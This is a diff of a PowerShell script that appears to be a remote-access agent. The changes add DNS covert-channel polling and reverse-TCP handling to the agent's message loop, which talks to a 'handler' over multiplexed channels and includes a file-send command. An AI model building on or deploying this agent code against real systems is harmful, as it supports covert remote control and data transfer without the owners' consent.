@@ -106,24 +106,30 @@ function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSOb
 function ReceiveHeader-Async-Start([PSObject] $transport) {
 
     $script = {
-        param([UInt32]$messageheaderlen, [PSObject]$transport)
+        param([UInt32]$messageheaderlen, [PSObject]$transport, [string]$connectionmethod, [string]$channelencryption)
 
-        # This is a copy of the Transport-Tls-Receive function
+        # This is a copy of the Transport-Tls-Receive / Transport-ReverseTcp-Receive function
+        # with some special case handling for DNS
         $numb = 0
 	    $buffer = New-Object byte[]($messageheaderlen)
 	    while ($numb -lt $messageheaderlen) {
-		    $numb += $transport.reader.Read($buffer, $numb, $messageheaderlen-$numb)
+	        if (($channelencryption -eq "TLS") -or ($connectionmethod -eq "REVERSETCP")) {
+		        $numb += $transport.reader.Read($buffer, $numb, $messageheaderlen-$numb)
+		    } elseif (($channelencryption -eq "NONE") -and ($connectionmethod -eq "DNS")) {
+		        $numb += $transport.stream.ReadSync($buffer, $numb, $messageheaderlen-$numb)
+		    } else {
+		        # ERROR with invalid $channelencryption and/or $connectionmethod
+		        return $NULL
+		    }
 	    }
-
-	    # TODO: add other transport modes!
 
 	    return $buffer
     }
 
     $p = [PowerShell]::Create()
-    $null = $p.AddScript($script).AddArgument($MESSAGE_HEADER_LEN).AddArgument($transport)
+    $null = $p.AddScript($script).AddArgument($MESSAGE_HEADER_LEN).AddArgument($transport).AddArgument($CONNECTIONMETHOD).AddArgument($CHANNELENCRYPTION)
     $job = $p.BeginInvoke()
-    Write-Host "DEBUG: started backgroud receive header process"
+    Write-Host "DEBUG: started background receive header process"
 
     #Write-Host $Channels[$downloadchannelid].sendqueue.Count
     #$done = $job.AsyncWaitHandle.WaitOne()
@@ -145,7 +151,7 @@ function ReceiveHeader-Async-IsDone([PSObject] $asyncobj) {
 
 function ReceiveHeader-Async-GetResult([PSObject] $asyncobj) {
 
-    Write-Host "DEBUG: ended backgroud receive header process"
+    Write-Host "DEBUG: ended background receive header process"
     return $asyncobj.shell.EndInvoke($asyncobj.job)
 
 }
@@ -196,8 +202,8 @@ if ($CHANNELENCRYPTION -eq "NONE") {
 Channel-setOpen $Channels[$MESSAGE_CHANNEL_COMMAND]
 
 # show hello message from handler
-$res = Message-ParseFromTransport $transport
-$res = Handle-Message $transport $res
+#$res = Message-ParseFromTransport $transport
+#$res = Handle-Message $transport $res
 
 #Write-Host "DEBUG: sending hello to handler"
 
@@ -207,10 +213,6 @@ $message1 = Message-Create -MType $MESSAGE_TYPE_MESSAGE -ChannelNumber $MESSAGE_
 Message-SendToTransport $message1 $transport
 
 #Write-Host "DEBUG: send hello to handler"
-
-# wait for command
-#$res = Message-ParseFromTransport $transport
-#$res = Handle-Message $transport $res
 
 # try to read message headers in the background
 $asyncobj = ReceiveHeader-Async-Start $transport
@@ -235,6 +237,9 @@ while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
     # store list of channels that can be closed now
     $channelstoremove = @{ }
 
+    # set this flag if we have sended at least one package
+    $hassended = $false
+
     # send data for each channel
     foreach ($chanid in $Channels.Keys) {
         if ($chanid -eq $MESSAGE_CHANNEL_COMMAND) {
@@ -245,10 +250,12 @@ while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
             $data = Channel-ReadToSend $Channels[$chanid] $MESSAGE_MAX_DATA_LEN
             $msg = Message-Create -MType $MESSAGE_TYPE_DATA -ChannelNumber $chanid -Content $data
             Message-SendToTransport $msg $transport
+            $hassended = $true
         } elseif (Channel-isClosed($Channels[$chanid])) {
             Write-Host "DEBUG: sending EOC"
             $msg = Message-Create -MType $MESSAGE_TYPE_EOC -ChannelNumber $chanid -Content $MESSAGE_EMPTY_CONTENT
             Message-SendToTransport $msg $transport
+            $hassended = $true
             $channelstoremove.Add($chanid, $chanid)
         }
     }
@@ -256,6 +263,12 @@ while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
     # remove closed channels from list
     foreach ($chanid in $channelstoremove.Keys) {
         $Channels.Remove($chanid)
+    }
+
+    # if we must poll, always send at least one package
+    if ((!$hassended) -and ($CHANNELENCRYPTION -eq "NONE") -and ($CONNECTIONMETHOD -eq "DNS")) {
+        Write-Host "DEBUG: sending a polling NODATA message to handler"
+        $initialtransport.stream.Write($NULL, 0, 0);
     }
 
 }
